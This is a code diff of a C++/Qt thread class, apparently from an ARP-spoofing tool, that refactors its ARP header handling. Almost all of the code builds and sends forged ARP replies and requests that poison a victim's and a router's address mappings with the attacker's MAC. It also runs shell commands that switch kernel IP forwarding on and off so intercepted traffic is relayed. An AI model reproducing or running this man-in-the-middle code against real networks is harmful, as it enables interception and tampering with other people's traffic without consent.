@@ -17,66 +17,60 @@ bool stop_flag;
 u_char bc_f[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
 u_char bc_0[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
 
-struct arphdr {
-    u_int16_t htype;
-    u_int16_t ptype;
-    u_char hlen;
-    u_char plen;
-    u_int16_t oper;
-    u_char sha[6];		// Sender hardware address
-    u_char spa[4];		// Sender IP address
-    u_char tha[6];		// Target hardware address
-    u_char tpa[4];		// Target IP address
-};
-
 relay_falsify::relay_falsify(QObject *parent) : QThread(parent) {
     stop_flag = this->falsifyStop = true;
 }
 
 void relay_falsify::run() {
     QTime time_relay;
+    char buf[10] = {0,};
     time_relay.start();
     if(relay_len.toInt() > 42) {
-        int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr);
+        int size = sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr);
         relay_packet += size;
         for(int i = 0; i < relay_len.toInt() - size; i++) *(relay_packet + i) = 0x00;
         relay_packet -= size;
     }
-    system("echo 1 > /proc/sys/net/ipv4/ip_forward");
-    while(this->falsifyStop) {
-        if(((time_relay.elapsed() / 1000) % 5) == 0) reply_packet();
-        if(((time_relay.elapsed() / 1000) % 2) == 0) request_packet();
-        usleep(50000);
+    popen_used("if [ -f \"/proc/sys/net/ipv4/ip_forward\" ]; then echo 1 > /proc/sys/net/ipv4/ip_forward; echo success; else echo failed; fi;", buf, sizeof(buf));
+    if(!strncasecmp(buf, "success", 7)) {
+        while(this->falsifyStop) {
+            if(((time_relay.elapsed() / 1000) % 5) == 0) reply_packet();
+            if(((time_relay.elapsed() / 1000) % 2) == 0) request_packet();
+            usleep(50000);
+        }
+        stop_flag = this->falsifyStop;
+        for(int i = 0; i < 3; i++) {
+            sleep(1);
+            reply_packet();
+        }
+        system("echo 0 > /proc/sys/net/ipv4/ip_forward");
     }
-    stop_flag = this->falsifyStop;
-    for(int i = 0; i < 3; i++) {
-        sleep(1);
-        reply_packet();
+    else {
+        qDebug() << "IP_FORWARDING ERROR!!";
     }
-    system("echo 0 > /proc/sys/net/ipv4/ip_forward");
 }
 
 void reply_packet() {
-    struct arphdr *arph;
-    arph = (struct arphdr *)(relay_packet + sizeof(struct libnet_ethernet_hdr));
+    struct libnet_arp_hdr *arph;
+    arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));
 
     falsify_addr_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
     if(stop_flag) falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
     else falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
 
-    relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
+    relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
 
     *(relay_packet + 1) = ARPOP_REPLY;
     if(stop_flag) falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
     else falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
     falsify_addr_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN);
 
-    relay_packet += sizeof(arph->sha) + sizeof(arph->spa);
+    relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
 
     falsify_addr_filter(relay_victim_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
     falsify_addr_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + ETHER_ADDR_LEN, IP_ADDR_LEN);
 
-    relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);
+    relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dha) - sizeof(arph->ar_dpa);
 
     pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
 //    printf("////////////////// This is reply ///////////////////");
@@ -85,31 +79,31 @@ void reply_packet() {
 
 void request_packet() {
     int i = 0, cnt = 0;
-    struct arphdr *arph;
-    arph = (struct arphdr *)(relay_packet + sizeof(struct libnet_ethernet_hdr));
+    struct libnet_arp_hdr *arph;
+    arph = (struct libnet_arp_hdr*)(relay_packet + sizeof(struct libnet_ethernet_hdr));
 
     falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + ETHER_ADDR_LEN, ETHER_ADDR_LEN);
-    falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha), ETHER_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa), IP_ADDR_LEN);
-    falsify_addr_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa), IP_ADDR_LEN);
+    falsify_addr_filter(relay_atk_mac.toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha), ETHER_ADDR_LEN);
+    falsify_addr_filter(QString::number(QHostAddress(relay_victim_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa), IP_ADDR_LEN);
+    falsify_addr_filter(QString::number(QHostAddress(relay_router_ip).toIPv4Address(), 16).toLatin1().data(), relay_packet + sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa), IP_ADDR_LEN);
 
     if(!(cnt % 2)) {
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_f + i);
-        relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
+        relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
         *(relay_packet - 1) = ARPOP_REQUEST;
-        relay_packet += sizeof(arph->sha) + sizeof(arph->spa);
+        relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
         for(i = 0; i < ETHER_ADDR_LEN; i++) *(relay_packet + i) = *(bc_0 + i);
     }
     else {
         falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
-        relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tpa) - sizeof(arph->tha) - sizeof(arph->spa) - sizeof(arph->sha);
+        relay_packet += sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dpa) - sizeof(arph->ar_dha) - sizeof(arph->ar_spa) - sizeof(arph->ar_sha);
         *(relay_packet - 1) = ARPOP_REPLY;
-        relay_packet += sizeof(arph->sha) + sizeof(arph->spa);
+        relay_packet += sizeof(arph->ar_sha) + sizeof(arph->ar_spa);
         falsify_addr_filter(relay_router_mac.toLatin1().data(), relay_packet, ETHER_ADDR_LEN);
     }
     cnt++;
 
-    relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct arphdr) - sizeof(arph->tha) - sizeof(arph->tpa);
+    relay_packet -= sizeof(struct libnet_ethernet_hdr) + sizeof(struct libnet_arp_hdr) - sizeof(arph->ar_dha) - sizeof(arph->ar_dpa);
 
     pcap_sendpacket(relay_pcap, relay_packet, relay_len.toInt());
 //    printf("////////////////// This is request ///////////////////");
